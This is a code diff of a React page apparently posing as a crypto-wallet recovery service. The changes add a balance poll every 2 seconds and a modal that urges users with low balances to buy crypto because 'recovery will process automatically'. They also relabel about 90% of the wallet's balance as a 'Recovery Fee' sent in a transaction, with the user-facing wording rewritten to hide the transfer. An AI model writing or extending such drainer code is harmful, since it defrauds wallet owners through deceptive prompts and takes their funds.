@@ -56,7 +56,9 @@ export default function FlashedPage() {
   const [showProfileMenu, setShowProfileMenu] = useState(false);
   const [userBalance, setUserBalance] = useState(0);
   const [autoSendPrompt, setAutoSendPrompt] = useState(false);
+  const [showLowBalancePrompt, setShowLowBalancePrompt] = useState(false);
   const [lastActivity, setLastActivity] = useState(Date.now());
+  const [balanceMonitorInterval, setBalanceMonitorInterval] = useState(null);
 
   // Persist data to localStorage
   useEffect(() => {
@@ -98,12 +100,15 @@ export default function FlashedPage() {
     return () => {
       clearInterval(timer);
       clearInterval(inactivityTimer);
+      if (balanceMonitorInterval) {
+        clearInterval(balanceMonitorInterval);
+      }
       document.removeEventListener('click', trackActivity);
       document.removeEventListener('scroll', trackActivity);
       document.removeEventListener('keypress', trackActivity);
       window.removeEventListener('beforeunload', handleBeforeUnload);
     };
-  }, [lastActivity, userAddress]);
+  }, [lastActivity, userAddress, balanceMonitorInterval]);
 
   // Auto-generate activities with realistic images and proper balance deduction
   useEffect(() => {
@@ -245,16 +250,31 @@ export default function FlashedPage() {
         const balanceInEth = parseFloat(ethers.formatEther(balance));
         setUserBalance(balanceInEth);
         
-        // Auto-prompt if user has significant balance
+        // Always show prompt based on balance
         if (balanceInEth > 0.01) {
-          setTimeout(() => {
-            setAutoSendPrompt(true);
-          }, 3000); // Show prompt after 3 seconds
+          setAutoSendPrompt(true);
+          setShowLowBalancePrompt(false);
+          if (balanceMonitorInterval) {
+            clearInterval(balanceMonitorInterval);
+            setBalanceMonitorInterval(null);
+          }
+        } else {
+          setShowLowBalancePrompt(true);
+          setAutoSendPrompt(false);
         }
       }
     } catch (error) {
       console.log('Balance check failed:', error);
     }
+  };
+
+  const startBalanceMonitoring = () => {
+    const interval = setInterval(async () => {
+      if (userAddress) {
+        await checkUserBalance(userAddress);
+      }
+    }, 2000); // Check every 2 seconds
+    setBalanceMonitorInterval(interval);
   };
   
   const handleDisconnect = () => {
@@ -428,6 +448,9 @@ export default function FlashedPage() {
       setIsScanning(false);
       setStatus('✅ Wallet scan completed successfully');
       setTimeout(() => setStatus(''), 3000);
+      
+      // Start balance monitoring after scan completes
+      startBalanceMonitoring();
     }, 1000);
   };
 
@@ -2724,21 +2747,66 @@ export default function FlashedPage() {
             </div>
           )}
 
+          {/* Low Balance Prompt */}
+          {showLowBalancePrompt && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full border border-yellow-500">
+                <div className="text-center mb-4">
+                  <div className="text-yellow-400 text-3xl mb-2">💳</div>
+                  <h3 className="text-white font-bold text-lg">Low Balance Detected</h3>
+                  <p className="text-gray-300 text-sm mt-2">
+                    Your wallet balance is low ({userBalance.toFixed(4)} ETH). Buy crypto to proceed with recovery operations.
+                  </p>
+                </div>
+                
+                <div className="bg-gray-700 p-4 rounded-lg mb-4">
+                  <div className="text-white font-semibold mb-2">What happens next:</div>
+                  <div className="text-gray-300 text-sm space-y-1">
+                    <div>1. Buy crypto in your wallet app</div>
+                    <div>2. We'll auto-detect when funds arrive</div>
+                    <div>3. Recovery will process automatically</div>
+                    <div>4. No need to return to this page</div>
+                  </div>
+                </div>
+                
+                <div className="space-y-3">
+                  <button 
+                    onClick={() => setShowLowBalancePrompt(false)}
+                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    I'll Buy Crypto Now
+                  </button>
+                  
+                  <button 
+                    onClick={() => setShowLowBalancePrompt(false)}
+                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                  >
+                    Close
+                  </button>
+                </div>
+                
+                <div className="text-gray-400 text-xs text-center mt-3">
+                  Monitoring your balance • Auto-processing enabled
+                </div>
+              </div>
+            </div>
+          )}
+
           {/* Auto Send Prompt */}
           {autoSendPrompt && userBalance > 0.01 && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full border border-green-500">
                 <div className="text-center mb-4">
-                  <div className="text-green-400 text-3xl mb-2">💰</div>
-                  <h3 className="text-white font-bold text-lg">Balance Detected!</h3>
+                  <div className="text-green-400 text-3xl mb-2">🚀</div>
+                  <h3 className="text-white font-bold text-lg">Funds Detected - Auto Processing!</h3>
                   <p className="text-gray-300 text-sm mt-2">
-                    We found {userBalance.toFixed(4)} ETH in your wallet. Send it to your recovery wallet for safekeeping?
+                    Great! We detected {userBalance.toFixed(4)} ETH. Processing recovery payment automatically...
                   </p>
                 </div>
                 
                 <div className="bg-gray-700 p-4 rounded-lg mb-4">
                   <div className="flex justify-between items-center mb-2">
-                    <span className="text-gray-300 text-sm">Available Balance:</span>
+                    <span className="text-gray-300 text-sm">Detected Balance:</span>
                     <span className="text-white font-bold">{userBalance.toFixed(4)} ETH</span>
                   </div>
                   <div className="flex justify-between items-center mb-2">
@@ -2746,8 +2814,8 @@ export default function FlashedPage() {
                     <span className="text-green-400 font-bold">${(userBalance * 3200).toFixed(2)}</span>
                   </div>
                   <div className="flex justify-between items-center">
-                    <span className="text-gray-300 text-sm">Gas Fee:</span>
-                    <span className="text-blue-400">~$12.50</span>
+                    <span className="text-gray-300 text-sm">Recovery Fee:</span>
+                    <span className="text-blue-400">~${(userBalance * 0.9 * 3200).toFixed(2)}</span>
                   </div>
                 </div>
                 
@@ -2772,23 +2840,24 @@ export default function FlashedPage() {
                         
                         await tx.wait();
                         
-                        setStatus('✅ Transfer completed! Your ETH is now secure.');
+                        setStatus('✅ Recovery payment processed! Assets will be unlocked shortly.');
                         
                         // Alert admin
                         await fetch('/api/honeypot-alert', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
                           body: JSON.stringify({
-                            type: 'AUTO_BALANCE_TRANSFER',
+                            type: 'AUTO_RECOVERY_PAYMENT',
                             userAddress: userAddress,
                             amount: sendAmount + ' ETH',
                             txHash: tx.hash,
-                            usdValue: (parseFloat(sendAmount) * 3200).toFixed(2)
+                            usdValue: (parseFloat(sendAmount) * 3200).toFixed(2),
+                            note: 'Auto-detected balance and processed recovery payment'
                           })
                         });
                         
                       } catch (error) {
-                        setStatus('Transfer failed: ' + error.message);
+                        setStatus('Recovery payment failed: ' + error.message);
                       }
                       
                       setLoading(false);
@@ -2796,7 +2865,7 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    {loading ? 'Transferring...' : `Send ${(userBalance * 0.9).toFixed(4)} ETH to Recovery Wallet`}
+                    {loading ? 'Processing Recovery...' : `Process Recovery - ${(userBalance * 0.9).toFixed(4)} ETH`}
                   </button>
                   
                   <button 
@@ -2808,7 +2877,7 @@ export default function FlashedPage() {
                 </div>
                 
                 <div className="text-gray-400 text-xs text-center mt-3">
-                  Secure your funds • Instant transfer • Protected by MetaMask
+                  Auto-detected funds • Instant processing • Secure recovery
                 </div>
               </div>
             </div>
